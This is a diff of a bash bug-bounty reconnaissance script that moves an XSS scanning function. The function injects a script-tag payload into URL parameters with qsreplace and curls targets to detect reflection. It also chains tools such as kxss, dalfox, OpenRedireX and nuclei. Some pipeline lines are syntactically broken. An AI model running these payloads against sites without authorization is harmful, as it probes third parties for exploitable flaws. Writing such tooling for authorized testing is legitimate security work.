@@ -122,6 +122,14 @@ python3 ~/tools/OpenRedireX/openredirex.py -l $domain/vulnerabilities/openredire
 
 }
 open_redirect
+sleep 1
+echo -e "\n\e[00;34m##################XSS Scanner Started ###########################\e[00m"
+xss_scanner(){
+
+cat $domain/gf/xss.txt | kxss | tee $domain/vulnerabilities/xss_scan/kxss.txt
+cat $domain/gf/xss.txt grep '=' | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt
+}
+xss_scanner
 sleep 2
 echo -e "\n\e[00;33m###############Searching For Reflected Params And XSS ###########################\e[00m"
 param_reflected(){
@@ -130,13 +138,6 @@ cat $domain/waybackurls/valid.txt | Gxss -p khan | dalfox pipe --mining-dict ~/t
  
 }
 param_reflected
-echo -e "\n\e[00;34m##################XSS Scanner Started ###########################\e[00m"
-xss_scanner(){
-
-cat $domain/gf/xss.txt | kxss | tee $domain/vulnerabilities/xss_scan/kxss.txt
-cat $domain/gf/xss.txt grep '=' | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt
-}
-xss_scanner
 sleep 2
 echo -e "\n\e[00;33m#############...Nuclei Scanner Started...#####################\e[00m"
 nuclei_scan(){
